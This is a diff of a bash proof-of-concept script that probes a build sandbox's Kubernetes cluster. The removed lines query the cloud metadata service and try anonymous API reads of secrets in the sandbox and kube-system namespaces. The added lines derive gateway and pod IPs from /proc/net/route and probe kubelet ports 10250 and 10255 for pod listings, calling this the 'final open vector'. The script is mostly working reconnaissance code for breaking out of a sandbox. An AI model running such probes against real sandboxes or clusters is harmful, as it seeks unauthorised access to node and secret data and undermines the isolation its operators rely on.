@@ -1,48 +1,38 @@
 #!/usr/bin/env bash
-# K8s API reachable from the build sandbox -- what does system:anonymous get?
-# READ-ONLY: GETs plus SelfSubjectRulesReview (non-mutating). No writes, no deletes.
+# Final open vector: the kubelet. Derive the node IP without `ip`/metadata, then probe.
 set +e
 B="YEXTPOC7731"; echo "$B-BEGIN"
-MD=http://169.254.169.254/computeMetadata/v1; H='Metadata-Flavor: Google'
-K=https://kubernetes.default.svc
 
-echo "$B === 0. NETWORK FACTS ==="
-cat /etc/resolv.conf 2>&1 | head -5
-NODEIP=$(curl -s -m 6 -H "$H" "$MD/instance/network-interfaces/0/ip" 2>&1); echo "node ip = $NODEIP"
-getent hosts kubernetes.default.svc 2>&1
-getent hosts kubernetes.default.svc.cluster.local 2>&1
+echo "$B === OWN IP + GATEWAY (from /proc, since `ip` is absent) ==="
+cat /proc/net/route 2>&1 | head -5
+GW_HEX=$(awk '$2=="00000000"{print $3; exit}' /proc/net/route 2>/dev/null)
+echo "gw hex = $GW_HEX"
+GW=$(python3 - "$GW_HEX" <<'PY' 2>/dev/null
+import sys,struct,socket
+h=sys.argv[1]
+if h: print(socket.inet_ntoa(struct.pack('<L',int(h,16))))
+PY
+)
+echo "gateway = $GW"
+SELF=$(python3 -c "
+import socket;s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
+s.connect(('10.192.32.1',443));print(s.getsockname()[0])" 2>&1)
+echo "own pod ip = $SELF"
 
-echo "$B === 1. K8S API AS system:anonymous ==="
-k(){ printf '%-56s ' "$1"; curl -sk -m 10 -o - -w ' [HTTP %{http_code}]' "$K$1" 2>&1 | tr -d '\n' | head -c 320; echo; }
-k /version
-k /api
-k /apis
-k /api/v1/namespaces
-k /api/v1/pods
-k /api/v1/secrets
-k /api/v1/namespaces/live-preview-sbx/secrets
-k /api/v1/namespaces/live-preview-sbx/pods
-k /api/v1/namespaces/kube-system/secrets
-k /api/v1/nodes
-k /healthz
-k /metrics
-
-echo "$B === 2. WHAT AM I? (SelfSubjectReview / RulesReview, anonymous) ==="
-curl -sk -m 10 -X POST -H 'content-type: application/json' \
- -o - -w ' [HTTP %{http_code}]' \
- "$K/apis/authentication.k8s.io/v1/selfsubjectreviews" \
- -d '{"apiVersion":"authentication.k8s.io/v1","kind":"SelfSubjectReview"}' 2>&1 | head -c 400; echo
-curl -sk -m 10 -X POST -H 'content-type: application/json' \
- -o - -w ' [HTTP %{http_code}]' \
- "$K/apis/authorization.k8s.io/v1/selfsubjectrulesreviews" \
- -d '{"apiVersion":"authorization.k8s.io/v1","kind":"SelfSubjectRulesReview","spec":{"namespace":"live-preview-sbx"}}' 2>&1 | head -c 600; echo
-
-echo "$B === 3. KUBELET ON THE REAL NODE IP ==="
-for P in 10250 10255; do
-  printf 'https://%s:%s/pods  ' "$NODEIP" "$P"
-  curl -sk -m 8 -o - -w ' [HTTP %{http_code}]' "https://$NODEIP:$P/pods" 2>&1 | tr -d '\n' | head -c 220; echo
-  printf 'http://%s:%s/pods   ' "$NODEIP" "$P"
-  curl -s  -m 8 -o - -w ' [HTTP %{http_code}]' "http://$NODEIP:$P/pods"  2>&1 | tr -d '\n' | head -c 220; echo
+echo "$B === KUBELET ON THE GATEWAY/NODE ==="
+for TGT in "$GW" "$SELF"; do
+  [ -z "$TGT" ] && continue
+  for P in 10250 10255; do
+    for S in https http; do
+      printf '%-7s %-16s :%-6s ' "$S" "$TGT" "$P"
+      curl -sk -m 6 -o - -w ' [HTTP %{http_code}]' "$S://$TGT:$P/pods" 2>&1 | tr -d '\n' | head -c 200; echo
+    done
+  done
 done
+
+echo "$B === CONTROL: is egress to the node blocked, or just those ports? ==="
+printf 'gateway:443   '; curl -sk -m 6 -o /dev/null -w '[HTTP %{http_code}]\n' "https://$GW:443/" 2>&1
+printf 'apiserver:443 '; curl -sk -m 6 -o /dev/null -w '[HTTP %{http_code}]\n' "https://10.192.32.1:443/version" 2>&1
+printf 'clusterdns:53 '; getent hosts kube-dns.kube-system.svc.cluster.local 2>&1 | head -1
 
 echo "$B-END"; exit 0
